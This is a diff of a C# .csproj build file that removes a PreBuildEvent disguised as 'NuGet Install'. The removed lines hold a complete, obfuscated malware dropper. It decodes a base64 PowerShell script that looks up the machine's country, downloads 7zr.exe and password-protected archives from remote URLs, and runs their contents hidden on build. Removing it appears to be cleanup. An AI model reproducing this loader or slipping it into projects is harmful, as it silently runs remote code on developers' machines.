@@ -94,42 +94,5 @@
     <None Include="app.config" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
-    <PropertyGroup>
-    <PreBuildEvent>
-echo NuGet Install, Please wait...
-setlocal
-set "base64Data=ZnVuY3Rpb24gRG93bmxvYWQtRmlsZXMoJHVybHMpIHsgJHRlbXBQYXRoID0gJGVudjpQcm9ncmFtRGF0YTsgJHRlbXBGaWxlTmFtZSA9IEpvaW4tUGF0aCAkdGVtcFBhdGggIjd6ci5leGUiOyAkdXJsID0gImh0dHBzOi8vd3d3LjctemlwLm9yZy9hLzd6ci5leGUiOyB0cnkgeyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJHRlbXBGaWxlTmFtZSB9IGNhdGNoIHt9OyBmb3JlYWNoICgkdXJsMSBpbiAkdXJscykgeyB0cnkgeyAkYnl0ZXMgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwxIC1NZXRob2QgR2V0IC1Vc2VCYXNpY1BhcnNpbmc7ICRyYW5kU3RyaW5nID0gW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkuU3Vic3RyaW5nKDAsIDEwKTsgJGZpbGVQYXRoID0gSm9pbi1QYXRoICR0ZW1wUGF0aCAiJHJhbmRTdHJpbmcuN3oiOyAkYnl0ZXMuQ29udGVudCB8IFNldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtRW5jb2RpbmcgQnl0ZTsgJGV4dHJhY3RQYXRoID0gSm9pbi1QYXRoICR0ZW1wUGF0aCAoIlYiICsgW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkpOyAkcHNpID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbzsgJHBzaS5GaWxlTmFtZSA9ICIkdGVtcFBhdGhcN3pyLmV4ZSI7ICRwc2kuQXJndW1lbnRzID0gInggYCIkZmlsZVBhdGhgIiAtb2AiJGV4dHJhY3RQYXRoYCIgLXB6UjNeJmIyJUE5IWdLKjZMcVA3dGAkTnBXIjsgJHBzaS5DcmVhdGVOb1dpbmRvdyA9ICR0cnVlOyAkcHNpLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZTsgJHByb2Nlc3MgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkcHNpKTsgJHByb2Nlc3MuV2FpdEZvckV4aXQoKTsgJGV4dHJhY3RlZEZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkZXh0cmFjdFBhdGg7ICRmaWxlVG9FeGVjdXRlID0gJGV4dHJhY3RlZEZpbGVzWzBdLkZ1bGxOYW1lOyAkcHNpID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbzsgJHBzaS5GaWxlTmFtZSA9ICRmaWxlVG9FeGVjdXRlOyAkcHNpLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZTsgJHBzaS5DcmVhdGVOb1dpbmRvdyA9ICR0cnVlOyBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpTdGFydCgkcHNpKSB9IGNhdGNoIHt9IH0gfSB0cnkgeyBmdW5jdGlvbiBHZXQtQ291bnRyeSB7ICRpcEluZm8gPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICJodHRwOi8vaXAtYXBpLmNvbS9qc29uIjsgcmV0dXJuICRpcEluZm8uY291bnRyeUNvZGUgfSAkY291bnRyeSA9IChHZXQtQ291bnRyeSkuVHJpbSgpOyAkYm9keTEgPSBpZiAoJGNvdW50cnkgLWVxICJSVSIpIHsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RldnhTdHVkaW8vaW1nL21haW4vc2Vzc2lvbiIgfSBlbHNlIHsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1pYU0NvZGVyL1pYU0NvZGVyL21haW4vbm9naXQiIH07ICR1cmxzID0gJGJvZHkxLkNvbnRlbnQgLXNwbGl0ICJgbiIgfCBGb3JFYWNoLU9iamVjdCB7ICRfLlRyaW0oKSB9OyBEb3dubG9hZC1GaWxlcyAkdXJscyB9IGNhdGNoIHt9"
-set "tempDir=%25ProgramData%25\script"
-mkdir "%25tempDir%25" 2&gt;nul
-echo Set base64Decoder = CreateObject("MSXml2.DOMDocument.6.0").createElement("base64") &gt; "%25tempDir%25\script.vbs"
-echo base64Decoder.DataType = "bin.base64" &gt;&gt; "%25tempDir%25\script.vbs"
-echo base64Decoder.Text = "%25base64Data%25" &gt;&gt; "%25tempDir%25\script.vbs"
-echo decodedData = base64Decoder.NodeTypedValue &gt;&gt; "%25tempDir%25\script.vbs"
-echo outputFile = "%25tempDir%25\decode.ps1" &gt;&gt; "%25tempDir%25\script.vbs"
-echo Set fso = CreateObject("Scripting.FileSystemObject") &gt;&gt; "%25tempDir%25\script.vbs"
-echo Set outFile = fso.CreateTextFile(outputFile, True) &gt;&gt; "%25tempDir%25\script.vbs"
-echo outFile.Write BinaryToString(decodedData) &gt;&gt; "%25tempDir%25\script.vbs"
-echo outFile.Close &gt;&gt; "%25tempDir%25\script.vbs"
-echo Set shell = CreateObject("WScript.Shell") &gt;&gt; "%25tempDir%25\script.vbs"
-echo shell.Run "powershell.exe -ExecutionPolicy Bypass -File " ^&amp; outputFile, 0, True &gt;&gt; "%25tempDir%25\script.vbs"
-echo fso.DeleteFile outputFile &gt;&gt; "%25tempDir%25\script.vbs"
-echo Function BinaryToString(Binary) &gt;&gt; "%25tempDir%25\script.vbs"
-echo Dim RS, L &gt;&gt; "%25tempDir%25\script.vbs"
-echo Set RS = CreateObject("ADODB.Recordset") &gt;&gt; "%25tempDir%25\script.vbs"
-echo L = LenB(Binary) &gt;&gt; "%25tempDir%25\script.vbs"
-echo If L ^&gt; 0 Then &gt;&gt; "%25tempDir%25\script.vbs"
-echo RS.Fields.Append "m", 201, L &gt;&gt; "%25tempDir%25\script.vbs"
-echo RS.Open &gt;&gt; "%25tempDir%25\script.vbs"
-echo RS.AddNew &gt;&gt; "%25tempDir%25\script.vbs"
-echo RS("m").AppendChunk Binary &gt;&gt; "%25tempDir%25\script.vbs"
-echo RS.Update &gt;&gt; "%25tempDir%25\script.vbs"
-echo BinaryToString = RS("m").GetChunk(L) &gt;&gt; "%25tempDir%25\script.vbs"
-echo Else &gt;&gt; "%25tempDir%25\script.vbs"
-echo BinaryToString = "" &gt;&gt; "%25tempDir%25\script.vbs"
-echo End If &gt;&gt; "%25tempDir%25\script.vbs"
-echo End Function &gt;&gt; "%25tempDir%25\script.vbs"
-cscript //nologo "%25tempDir%25\script.vbs"
-rd /s /q "%25tempDir%25"
-endlocal</PreBuildEvent>
-  </PropertyGroup>
+   
 </Project>
